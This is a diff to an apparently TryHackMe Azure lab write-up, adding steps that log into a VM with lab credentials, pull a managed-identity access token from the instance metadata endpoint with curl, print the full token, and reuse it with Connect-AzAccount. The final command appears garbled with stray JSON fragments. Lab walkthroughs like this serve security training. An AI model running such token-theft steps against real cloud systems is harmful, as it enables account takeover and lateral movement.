@@ -40,6 +40,45 @@ Access it <a href="https://tryhackme.com/room/eyeswideshut">here</a>.<br>
 - navigate to <code>Azure Portal</code><br>
 - access Lab using <code>Username</code> and <code>Password</code> provided in the <code>Credential</code>´s section.</p>
 
+<img width="396" height="206" alt="image" src="https://github.com/user-attachments/assets/3771bcd4-bdc3-44b8-aab5-4c1521b3bfca" />
+
+<p>
+  
+- <code>Resources</code> > <code>View all resources</code></p>
+
+<img width="1909" height="897" alt="image" src="https://github.com/user-attachments/assets/85ac21ca-9ca7-44bc-aa98-32f0e7621313" />
+
+<p>
+  
+- <code>LinuxVM</code><br>
+- <code>Connect</code> > <code>Connect</code><br>
+- identify <code>azureuser</code><br>
+- <code>Connect via Azure CLI</code><br>
+- identify <code>ssh azureuser@20.42.104.23</code></p>
+
+
+<img width="1894" height="901" alt="image" src="https://github.com/user-attachments/assets/766d720f-43de-4dc0-aef0-987a0f108685" />
+
+
+<p>
+  
+- consider the discovery of <code>azureuser@20.42.104.23</code> in the reconnaissance --> <code>azureuser</code> : <code>WhereIsMyMind$#@!</code></p>
+
+
+<img width="1916" height="892" alt="image" src="https://github.com/user-attachments/assets/e387843f-d756-42d8-93b5-d51652f63d2d" />
+
+
+```bash
+azureuser@LinuxVM:~$ curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSIsImtpZCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjI2MTg1NDksIm5iZiI6MTc2MjYxODU0OSwiZXhwIjoxNzYyNzA1MjQ5LCJhaW8iOiJBV1FBbS84YUFBQUFFRlgrOHViamhicnRzc1BvZ1V4MlloTVFTVzM4N00yY0tFWTVZSVN5QUR3dXZBVjZMbWYyQ2hMTWg5VjI0NUpiQVRGcDBiaTN5UnI3TDdKdTdkUnpERHVZUDhIdE8wdXMyNzIzYnNYTmh3S0Z0Zk1NdXpNeXBwRnRkbGxkMys2SiIsImFwcGlkIjoiOWEyNjU2NzAtZDc3MS00YWI1LTkyZGYtYjVjN2EzODFjOWUwIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNWE4ZTNkMzktNDcyMS00OTY0LThlNGEtOTY4NDMzOGQ5NzEzIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiI1YThlM2QzOS00NzIxLTQ5NjQtOGU0YS05Njg0MzM4ZDk3MTMiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJGQzh6YjhfaHhraWFVZjRUYl9ESEFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoidnhkVEw0bjBuNFVoRWsxeGdoZ29QbUs5Q0dvVUtRQkVGQy1idnlJaG9lc0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiI3IDEwIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMDgwODk0L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.XbxLltSDaMqpuWgM8OCmB6O82C4nQYZyLPPxyLEqHvpfiWSsJ-uget26TwnmaRc1X1zakUuzRN6wAWbAsE0V-Q2rzIRW1HtRBR3Hu-NyDTGmWgKbXp7U-CmPf-YpCGVUxy8eXqZPeIOtA0CVRGFK_66nrkL0rdXk97ultDybO-UML47yKWed3I4m3rp1E_SJKSnNEcCi6GW931n80KS-dkMBJSrKvTMAHDWkLikOKSjiFSv_OhrKava0sjv5oERXGzHr2Ncd-iIb97-kIWNcQexYOQ5LLlqOaDZXO5iJWWBZJi7JnoTrACokyBLmMoGqvrWNn-KpAY6WHSipX_QM2w","client_id":"9a265670-d771-4ab5-92df-b5c7a381c9e0","expires_in":"85829","expires_on":"1762705249","ext_expires_in":"86399","not_before":"1762618549","resource":"https://management.azure.com/","token_type":"Bearer"}
+```
+
+```bash
+Connect-AzAccount -AccessToken eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSIsImtpZCI6InlFVXdtWFdMMTA3Q2MtN1FaMldTYmVPYjNzUSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjI2MTg1NDksIm5iZiI6MTc2MjYxODU0OSwiZXhwIjoxNzYyNzA1MjQ5LCJhaW8iOiJBV1FBbS84YUFBQUFFRlgrOHViamhicnRzc1BvZ1V4MlloTVFTVzM4N00yY0tFWTVZSVN5QUR3dXZBVjZMbWYyQ2hMTWg5VjI0NUpiQVRGcDBiaTN5UnI3TDdKdTdkUnpERHVZUDhIdE8wdXMyNzIzYnNYTmh3S0Z0Zk1NdXpNeXBwRnRkbGxkMys2SiIsImFwcGlkIjoiOWEyNjU2NzAtZDc3MS00YWI1LTkyZGYtYjVjN2EzODFjOWUwIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNWE4ZTNkMzktNDcyMS00OTY0LThlNGEtOTY4NDMzOGQ5NzEzIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiI1YThlM2QzOS00NzIxLTQ5NjQtOGU0YS05Njg0MzM4ZDk3MTMiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJGQzh6YjhfaHhraWFVZjRUYl9ESEFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoidnhkVEw0bjBuNFVoRWsxeGdoZ29QbUs5Q0dvVUtRQkVGQy1idnlJaG9lc0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiI3IDEwIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMDgwODk0L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.XbxLltSDaMqpuWgM8OCmB6O82C4nQYZyLPPxyLEqHvpfiWSsJ-uget26TwnmaRc1X1zakUuzRN6wAWbAsE0V-Q2rzIRW1HtRBR3Hu-NyDTGmWgKbXp7U-CmPf-YpCGVUxy8eXqZPeIOtA0CVRGFK_66nrkL0rdXk97ultDybO-UML47yKWed3I4m3rp1E_SJKSnNEcCi6GW931n80KS-dkMBJSrKvTMAHDWkLikOKSjiFSv_OhrKava0sjv5oERXGzHr2Ncd-iIb97-kIWNcQexYOQ5LLlqOaDZXO5iJWWBZJi7JnoTrACokyBLmMoGqvrWNn-KpAY6WHSipX_QM2w","client_id":"9a265670-d771-4ab5-92df-b5c7a381c9e0 -AccountId 9a265670-d771-4ab5-92df-b5c7a381c9e0
+```
+
+
+
 <br>
 <h2>Task 2 . Managed Identities</h2>
 <p>A managed identity is a special type of service principal that can only be used with Azure resources. It provides an identity for applications to use when connecting to services that support Entra ID authentication. By using managed identities, developers can avoid managing credentials manually, simplifying security and reducing potential risks.<br>
